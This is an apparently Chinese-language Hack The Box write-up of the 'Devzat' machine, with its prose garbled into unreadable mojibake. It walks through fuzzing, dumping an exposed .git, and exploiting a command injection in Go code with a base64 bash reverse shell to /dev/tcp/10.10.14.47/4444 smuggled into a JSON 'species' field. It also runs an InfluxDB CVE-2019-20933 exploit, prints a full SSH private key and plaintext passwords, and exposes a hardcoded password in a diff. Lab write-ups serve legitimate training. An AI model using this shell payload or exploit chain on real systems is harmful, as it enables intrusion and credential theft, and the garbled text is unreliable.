Httpè¿™é‡Œæœ‰ä¸€ä¸ªhttpæœåŠ¡åœ¨80ç«¯å£ï¼Œç›´æ¥è®¿é—®ipä¼šè¢«è·³è½¬åˆ°devzat.htbé¡µé¢ï¼Œå’±ä»¬æ·»åŠ åˆ°hostså†ç»§ç»­è®¿é—® echo 10.10.11.118 devzat.htb &gt;&gt; /etc/hosts è¿™ä¸ªåŠŸèƒ½é¡µé¢æœ‰ç‚¹ä¸æ˜æ‰€ä»¥ï¼Œå¾€ä¸‹çœ‹çœ‹ è¿™é‡Œæç¤ºäº†ä¸€æ¡å‘½ä»¤ï¼ŒsshæœåŠ¡ç–‘ä¼¼åœ¨8000ç«¯å£ æœç´¢ç›¸å…³èµ„æ–™ï¼Œæ‰¾åˆ°äº†ç›¸å…³å·¥å…· https://github.com/quackduck/devzat å»æµ‹è¯•ä¸€ä¸‹è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh -l test devzat.htb -p 8000 8 minutes earlier devbot: test has joined the chat test: test test: test test: test test: test devbot: test has left the chat devbot: test has joined the chat 1 minute earlier devbot: test has left the chat devbot: test stayed on for 6 minutes devbot: test has joined the chat devbot: test has left the chat devbot: lucifiel has joined the chat devbot: lucifiel has left the chat devbot: test has joined the chat Less than a minute earlier devbot: test has left the chat devbot: test stayed on for 1 minute Welcome to the chat. There are no more users devbot: test has joined the chat test: /help [SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat [SYSTEM] Because there&#39;s SSH apps on all platforms, even on mobile, you can join from anywhere. [SYSTEM] [SYSTEM] Interesting features: [SYSTEM] â€¢ Many, many commands. Run /commands. [SYSTEM] â€¢ Rooms! Run /room to see all rooms and use /room #foo to join a new room. [SYSTEM] â€¢ Markdown support! Tables, headers, italics and everything. Just use in place of newlines. [SYSTEM] â€¢ Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example. [SYSTEM] â€¢ Direct messages! Send a quick DM using =user &lt;msg&gt; or stay in DMs by running /room @user. [SYSTEM] â€¢ Timezone support, use /tz Continent/City to set your timezone. [SYSTEM] â€¢ Built in Tic Tac Toe and Hangman! Run /tic or /hang &lt;word&gt; to start new games. [SYSTEM] â€¢ Emoji replacements! (like on Slack and Discord) [SYSTEM] [SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php. [SYSTEM] [SYSTEM] Made by Ishan Goel with feature ideas from friends. [SYSTEM] Thanks to Caleb Denio for lending his server! [SYSTEM] [SYSTEM] For a list of commands run [SYSTEM] â”ƒ /commands test: /commands [SYSTEM] Commands [SYSTEM] clear - Clears your terminal [SYSTEM] message - Sends a private message to someone [SYSTEM] users - Gets a list of the active users [SYSTEM] all - Gets a list of all users who has ever connected [SYSTEM] exit - Kicks you out of the chat incase your client was bugged [SYSTEM] bell - Toggles notifications when you get pinged [SYSTEM] room - Changes which room you are currently in [SYSTEM] id - Gets the hashed IP of the user [SYSTEM] commands - Get a list of commands [SYSTEM] nick - Change your display name [SYSTEM] color - Change your display name color [SYSTEM] timezone - Change how you view time [SYSTEM] emojis - Get a list of emojis you can use [SYSTEM] help - Get generic info about the server [SYSTEM] tictactoe - Play tictactoe [SYSTEM] hangman - Play hangman [SYSTEM] shrug - Drops a shrug emoji [SYSTEM] ascii-art - Bob ross with text [SYSTEM] example-code - Hello world! test: /users [SYSTEM] [test] æ²¡æœ‰å‘ç°å¯åˆ©ç”¨çš„ç‚¹ Fuzzå»fuzzä¸€ä¸‹å­åŸŸåçœ‹ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -c -u http://devzat.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H &quot;Host: FUZZ.devzat.htb&quot; -mc 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://devzat.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.devzat.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ pets [Status: 200, Size: 510, Words: 20, Lines: 21] :: Progress: [4989/4989] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:33] :: Errors: 0 :: æœ‰ä¸€ä¸ªpetsï¼ŒåŠ å…¥hostsé‡Œ echo 10.10.11.118 pets.devzat.htb &gt;&gt; /etc/hosts â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://pets.devzat.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 510 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://pets.devzat.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 510 ________________________________________________ .git [Status: 301, Size: 41, Words: 3, Lines: 3] .git/index [Status: 200, Size: 3884, Words: 51, Lines: 11] .git/config [Status: 200, Size: 92, Words: 9, Lines: 6] .git/HEAD [Status: 200, Size: 23, Words: 2, Lines: 2] .git/logs/ [Status: 200, Size: 63, Words: 3, Lines: 5] build [Status: 301, Size: 42, Words: 3, Lines: 3] css [Status: 301, Size: 40, Words: 3, Lines: 3] server-status [Status: 403, Size: 280, Words: 20, Lines: 10] :: Progress: [4686/4686] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:31] :: Errors: 0 :: å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª.gitæ–‡ä»¶ï¼Œé‚£å°±æ˜¯æœ‰gitå¤‡ä»½ï¼Œä¸‹è½½ä¸‹æ¥ GitTools https://github.com/LucifielHack/GitTools ä½¿ç”¨GitToolsç»™ä¸‹è½½ä¸‹æ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/GitTools] â””â”€# ./Dumper/gitdumper.sh http://pets.devzat.htb/.git/ pets ########### # GitDumper is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### ä½¿ç”¨gitdumperç»™dumpä¸‹æ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/GitTools] â””â”€# ./Extractor/extractor.sh pets ~/Desktop/pets/ ########### # Extractor is part of https://github.com/internetwache/GitTools # # Developed and maintained by @gehaxelt from @internetwache # # Use at your own risk. Usage might be illegal in certain circumstances. # Only for educational purposes! ########### ç„¶åä½¿ç”¨exractorç»™è§£å‹å‡ºæ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/pets] â””â”€# ls -la æ€»ç”¨é‡ 20 drwxr-xr-x 5 root root 4096 2æœˆ 19 03:50 . drwxr-xr-x 6 root root 4096 2æœˆ 19 03:50 .. drwxr-xr-x 4 root root 4096 2æœˆ 19 03:50 0-464614f32483e1fde60ee53f5d3b4d468d80ff62 drwxr-xr-x 4 root root 4096 2æœˆ 19 03:50 1-ef07a04ebb2fc92cf74a39e0e4b843630666a705 drwxr-xr-x 4 root root 4096 2æœˆ 19 03:50 2-8274d7a547c0c3854c074579dfc359664082a8f6 ä¸‹è½½å¯ä»¥å»æœ¬åœ°æŸ¥çœ‹äº† ä»£ç å®¡è®¡package main import ( &quot;embed&quot; &quot;encoding/json&quot; &quot;fmt&quot; &quot;io/fs&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;net/http&quot; &quot;os/exec&quot; &quot;time&quot; ) //go:embed static/public var web embed.FS //go:embed static/public/index.html var index []byte type Pet struct { Name string `json:&quot;name&quot;` Species string `json:&quot;species&quot;` Characteristics string `json:&quot;characteristics&quot;` } var ( Pets []Pet = []Pet{ {Name: &quot;Cookie&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Mia&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Chuck&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Balu&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Georg&quot;, Species: &quot;gopher&quot;, Characteristics: loadCharacter(&quot;gopher&quot;)}, {Name: &quot;Gustav&quot;, Species: &quot;giraffe&quot;, Characteristics: loadCharacter(&quot;giraffe&quot;)}, {Name: &quot;Rudi&quot;, Species: &quot;redkite&quot;, Characteristics: loadCharacter(&quot;redkite&quot;)}, {Name: &quot;Bruno&quot;, Species: &quot;bluewhale&quot;, Characteristics: loadCharacter(&quot;bluewhale&quot;)}, } ) func loadCharacter(species string) string { cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species) stdoutStderr, err := cmd.CombinedOutput() if err != nil { return err.Error() } return string(stdoutStderr) } func getPets(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode(Pets) } func addPet(w http.ResponseWriter, r *http.Request) { reqBody, _ := ioutil.ReadAll(r.Body) var addPet Pet err := json.Unmarshal(reqBody, &amp;addPet) if err != nil { e := fmt.Sprintf(&quot;There has been an error: %+v&quot;, err) http.Error(w, e, http.StatusBadRequest) return } addPet.Characteristics = loadCharacter(addPet.Species) Pets = append(Pets, addPet) w.WriteHeader(http.StatusOK) fmt.Fprint(w, &quot;Pet was added successfully&quot;) } func handleRequest() { build, err := fs.Sub(web, &quot;static/public/build&quot;) if err != nil { panic(err) } css, err := fs.Sub(web, &quot;static/public/css&quot;) if err != nil { panic(err) } webfonts, err := fs.Sub(web, &quot;static/public/webfonts&quot;) if err != nil { panic(err) } spaHandler := http.HandlerFunc(spaHandlerFunc) // Single page application handler http.Handle(&quot;/&quot;, headerMiddleware(spaHandler)) // All static folder handler http.Handle(&quot;/build/&quot;, headerMiddleware(http.StripPrefix(&quot;/build&quot;, http.FileServer(http.FS(build))))) http.Handle(&quot;/css/&quot;, headerMiddleware(http.StripPrefix(&quot;/css&quot;, http.FileServer(http.FS(css))))) http.Handle(&quot;/webfonts/&quot;, headerMiddleware(http.StripPrefix(&quot;/webfonts&quot;, http.FileServer(http.FS(webfonts))))) http.Handle(&quot;/.git/&quot;, headerMiddleware(http.StripPrefix(&quot;/.git&quot;, http.FileServer(http.Dir(&quot;.git&quot;))))) // API routes apiHandler := http.HandlerFunc(petHandler) http.Handle(&quot;/api/pet&quot;, headerMiddleware(apiHandler)) log.Fatal(http.ListenAndServe(&quot;:5000&quot;, nil)) } func spaHandlerFunc(w http.ResponseWriter, r *http.Request) { w.WriteHeader(http.StatusOK) w.Write(index) } func petHandler(w http.ResponseWriter, r *http.Request) { // Dispatch by method if r.Method == http.MethodPost { addPet(w, r) } else if r.Method == http.MethodGet { getPets(w, r) } else { http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed) } // TODO: Add Update and Delete } func headerMiddleware(next http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Header().Add(&quot;Server&quot;, &quot;My genious go pet server&quot;) next.ServeHTTP(w, r) }) } func main() { resetTicker := time.NewTicker(5 * time.Second) done := make(chan bool) go func() { for { select { case &lt;-done: return case &lt;-resetTicker.C: // Reset Pets to prestaged ones Pets = []Pet{ {Name: &quot;Cookie&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Mia&quot;, Species: &quot;cat&quot;, Characteristics: loadCharacter(&quot;cat&quot;)}, {Name: &quot;Chuck&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Balu&quot;, Species: &quot;dog&quot;, Characteristics: loadCharacter(&quot;dog&quot;)}, {Name: &quot;Georg&quot;, Species: &quot;gopher&quot;, Characteristics: loadCharacter(&quot;gopher&quot;)}, {Name: &quot;Gustav&quot;, Species: &quot;giraffe&quot;, Characteristics: loadCharacter(&quot;giraffe&quot;)}, {Name: &quot;Rudi&quot;, Species: &quot;redkite&quot;, Characteristics: loadCharacter(&quot;redkite&quot;)}, {Name: &quot;Bruno&quot;, Species: &quot;bluewhale&quot;, Characteristics: loadCharacter(&quot;bluewhale&quot;)}, } } } }() handleRequest() time.Sleep(500 * time.Millisecond) resetTicker.Stop() done &lt;- true } å‘ç°å­˜åœ¨ä¸€ä¸ªmain.goçš„æ–‡ä»¶ï¼Œå’±ä»¬çœ‹ä¸€ä¸‹ cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, &quot;cat characteristics/&quot;+species) addPet.Characteristics = loadCharacter(addPet.Species) çœ‹ä¸‹è¿™ä¸¤å¥ï¼Œå¾ˆæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥ã€‚ æ·»åŠ å® ç‰©åŠŸèƒ½ç‚¹çš„speciesç›´æ¥æ‹¼æ¥åœ¨cmdä¸­ï¼Œå’±ä»¬å»æ„é€ Exploit æ¼æ´åˆ©ç”¨Shellecho &quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.14.47/4444 &lt;&amp;1&#39;&quot; | base64 YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg== {&quot;name&quot;:&quot;lucifiel&quot;,&quot;species&quot;:&quot;cat;echo -n &#39;YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==&#39; | base64 -d | bash&quot;} é¦–å…ˆå»æŠ“ä¸ªåŒ… æ¥ç€æ›¿æ¢expç„¶åä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.47] from (UNKNOWN) [10.10.11.118] 33274 bash: cannot set terminal process group (889): Inappropriate ioctl for device bash: no job control in this shell patrick@devzat:~/pets$ whoami&amp;&amp;id whoami&amp;&amp;id patrick uid=1000(patrick) gid=1000(patrick) groups=1000(patrick) æˆåŠŸè·å¾—ä¸€ä¸ªshell ä½¿ç”¨python3è·å¾—ä¸€ä¸ªäº¤äº’å¼shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; Useråœ¨å½“å‰ç”¨æˆ·patrickç›®å½•ä¸‹å­˜åœ¨sshç§˜é’¥ cat /home/.ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# chmod 700 id_rsa â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh patrick@10.10.11.118 -i id_rsa Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 19 Feb 2022 09:20:45 AM UTC System load: 0.01 Processes: 243 Usage of /: 55.8% of 7.81GB Users logged in: 1 Memory usage: 23% IPv4 address for docker0: 172.17.0.1 Swap usage: 0% IPv4 address for eth0: 10.10.11.118 107 updates can be applied immediately. 33 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Feb 19 09:18:30 2022 from 10.10.16.23 æˆåŠŸç™»å½•ssh patrick@devzat:~$ whoami&amp;&amp;id patrick uid=1000(patrick) gid=1000(patrick) groups=1000(patrick) ç«¯å£è½¬å‘patrick@devzat:~$ ss -tunlp Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8086 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:8443 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:5000 0.0.0.0:* users:((&quot;petshop&quot;,pid=908,fd=3)) tcp LISTEN 0 511 *:80 *:* tcp LISTEN 0 128 [::]:22 [::]:* tcp LISTEN 0 4096 *:8000 *:* users:((&quot;devchat&quot;,pid=907,fd=7)) è¿™é‡Œæˆ‘ä»¬æŠŠ8086ç«¯å£è½¬å‘å‡ºå» â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i id_rsa Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 19 Feb 2022 09:30:33 AM UTC System load: 0.0 Processes: 246 Usage of /: 55.8% of 7.81GB Users logged in: 1 Memory usage: 23% IPv4 address for docker0: 172.17.0.1 Swap usage: 0% IPv4 address for eth0: 10.10.11.118 107 updates can be applied immediately. 33 of these updates are standard security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Feb 19 09:20:46 2022 from 10.10.14.47 æˆåŠŸè½¬å‘å‡ºæ¥ Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -p 8086 -sC -sV 127.0.0.1 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 04:33 EST Nmap scan report for localhost (127.0.0.1) Host is up (0.000048s latency). PORT STATE SERVICE VERSION 8086/tcp open http InfluxDB http admin 1.7.5 |_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds Exploitè¿™é‡Œå‘ç°æ˜¯InfluxDBï¼Œå»æœç´¢ä¸€ä¸‹æ˜¯å¦æœ‰ç›¸å…³çš„æ¼æ´ https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 ä½¿ç”¨è¯¥Exploitè¿›è¡Œæ”»å‡» git clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git cd InfluxDB-Exploit-CVE-2019-20933 pip install -r requirements.txt ä¸‹è½½å®‰è£…æ‰€éœ€è¦çš„ç¯å¢ƒ ç„¶åæ‰§è¡Œ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/InfluxDB-Exploit-CVE-2019-20933] â””â”€# python3 __main__.py _____ __ _ _____ ____ ______ _ _ _ |_ _| / _| | | __ \\| _ \\ | ____| | | (_) | | | _ __ | |_| |_ ___ __ | | | |_) | | |__ __ ___ __ | | ___ _| |_ | | | &#39;_ \\| _| | | | \\ \\/ / | | | _ &lt; | __| \\ \\/ / &#39;_ \\| |/ _ \\| | __| _| |_| | | | | | | |_| |&gt; &lt;| |__| | |_) | | |____ &gt; &lt;| |_) | | (_) | | |_ |_____|_| |_|_| |_|\\__,_/_/\\_\\_____/|____/ |______/_/\\_\\ .__/|_|\\___/|_|\\__| | | |_| - using CVE-2019-20933 Host (default: localhost): Port (default: 8086): Username &lt;OR&gt; path to username file (default: users.txt): Bruteforcing usernames ... [v] admin Host vulnerable !!! Databases: 1) devzat 2) _internal .quit to exit [admin@127.0.0.1] Database: devzat Starting InfluxDB shell - .back to go back [admin@127.0.0.1/devzat] $ SELECT * FROM &quot;user&quot; { &quot;results&quot;: [ { &quot;series&quot;: [ { &quot;columns&quot;: [ &quot;time&quot;, &quot;enabled&quot;, &quot;password&quot;, &quot;username&quot; ], &quot;name&quot;: &quot;user&quot;, &quot;values&quot;: [ [ &quot;2021-06-22T20:04:16.313965493Z&quot;, false, &quot;WillyWonka2021&quot;, &quot;wilhelm&quot; ], [ &quot;2021-06-22T20:04:16.320782034Z&quot;, true, &quot;woBeeYareedahc7Oogeephies7Aiseci&quot;, &quot;catherine&quot; ], [ &quot;2021-06-22T20:04:16.996682002Z&quot;, true, &quot;RoyalQueenBee$&quot;, &quot;charles&quot; ] ] } ], &quot;statement_id&quot;: 0 } ] } Catherineåœ¨sshä¸­ä½¿ç”¨suåˆ‡æ¢åˆ°catherineç”¨æˆ· username = catherine password = woBeeYareedahc7Oogeephies7Aiseci catherine@devzat:~$ ls dev devzat-dev.zip devzat-main.zip main user.txt catherine@devzat:~$ cat user.txt a45f55a41f9cd103ea222c1e00466341 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡catherine@devzat:/var/backups$ ls apt.extended_states.0 apt.extended_states.1.gz apt.extended_states.2.gz devzat-dev.zip devzat-main.zip åœ¨&#x2F;var&#x2F;backupsç›®å½•ä¸­æœ‰ä¸¤ä¸ªzipæ–‡ä»¶ï¼Œæˆ‘ä»¬copyå‡ºæ¥è§£å‹å‡ºæ¥çœ‹çœ‹ catherine@devzat:/tmp/lucifiel$ ls dev devzat-dev.zip devzat-main.zip main catherine@devzat:/tmp/lucifiel$ diff main/commands.go dev/commands.go 3a4 &gt; &quot;bufio&quot; 4a6,7 &gt; &quot;os&quot; &gt; &quot;path/filepath&quot; 36a40 &gt; file = commandInfo{&quot;file&quot;, &quot;Paste a files content directly to chat [alpha]&quot;, fileCommand, 1, false, nil} 38c42,101 &lt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode} --- &gt; commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file} &gt; } &gt; &gt; func fileCommand(u *user, args []string) { &gt; if len(args) &lt; 1 { &gt; u.system(&quot;Please provide file to print and the password&quot;) &gt; return &gt; } &gt; &gt; if len(args) &lt; 2 { &gt; u.system(&quot;You need to provide the correct password to use this function&quot;) &gt; return &gt; } &gt; &gt; path := args[0] &gt; pass := args[1] &gt; &gt; // Check my secure password &gt; if pass != &quot;CeilingCatStillAThingIn2021?&quot; { &gt; u.system(&quot;You did provide the wrong password&quot;) &gt; return &gt; } &gt; &gt; // Get CWD &gt; cwd, err := os.Getwd() &gt; if err != nil { &gt; u.system(err.Error()) &gt; } &gt; &gt; // Construct path to print &gt; printPath := filepath.Join(cwd, path) &gt; &gt; // Check if file exists &gt; if _, err := os.Stat(printPath); err == nil { &gt; // exists, print &gt; file, err := os.Open(printPath) &gt; if err != nil { &gt; u.system(fmt.Sprintf(&quot;Something went wrong opening the file: %+v&quot;, err.Error())) &gt; return &gt; } &gt; defer file.Close() &gt; &gt; scanner := bufio.NewScanner(file) &gt; for scanner.Scan() { &gt; u.system(scanner.Text()) &gt; } &gt; &gt; if err := scanner.Err(); err != nil { &gt; u.system(fmt.Sprintf(&quot;Something went wrong printing the file: %+v&quot;, err.Error())) &gt; } &gt; &gt; return &gt; &gt; } else if os.IsNotExist(err) { &gt; // does not exist, print error &gt; u.system(fmt.Sprintf(&quot;The requested file @ %+v does not exist!&quot;, printPath)) &gt; return &gt; } &gt; // bokred? &gt; u.system(&quot;Something went badly wrong.&quot;) è¿™é‡Œè·å¾—äº†ä¸€ä¸ªå¯†ç CeilingCatStillAThingIn2021?ï¼ŒåŒæ—¶åˆ†æä»£ç åçŸ¥é“äº†å­˜åœ¨å¯æ§çš„æ–‡ä»¶è¯»å–åŠŸèƒ½ï¼Œé€šè¿‡æ§åˆ¶ç¬¬ä¸€ä¸ªå‚æ•°æ§åˆ¶è·¯å¾„ï¼Œé€šè¿‡æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°passç»•è¿‡æ£€æµ‹ ssh -l test localhost -p 8443 catherine@devzat:/tmp/lucifiel$ ssh -l test localhost -p 8443 13 minutes earlier devbot: catherine has joined the chat 12 minutes earlier catherine: all 1 minute 